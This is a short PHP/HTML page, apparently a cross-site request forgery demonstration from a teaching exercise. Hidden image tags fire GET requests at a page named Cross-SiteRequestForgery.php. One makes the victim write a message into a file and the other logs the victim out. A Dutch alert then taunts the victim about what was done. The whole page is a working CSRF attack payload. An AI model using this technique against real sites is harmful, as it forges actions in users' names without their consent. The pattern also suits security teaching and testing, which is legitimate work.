<html>
<!DOCTYPE html>
<head>
	<meta charset="utf-8" />
<?php
echo '<img src="Cross-SiteRequestForgery.php?write=All your base are belong to us.&enter=click">';
echo '<img src="Cross-SiteRequestForgery.php?logout=logout">';
echo '<br />';
echo '<script> alert("Oei, deze foto\'s laden precies niet zo goed. :/\n Trouwens, er is iets in je file geschreven. \nGa even terug naar de vorige pagina. Als je die herlaadt zal je het wel zien. Ik heb je ook ineens uitgelogd. \;)\nGraag gedaan"); </script>';

?>
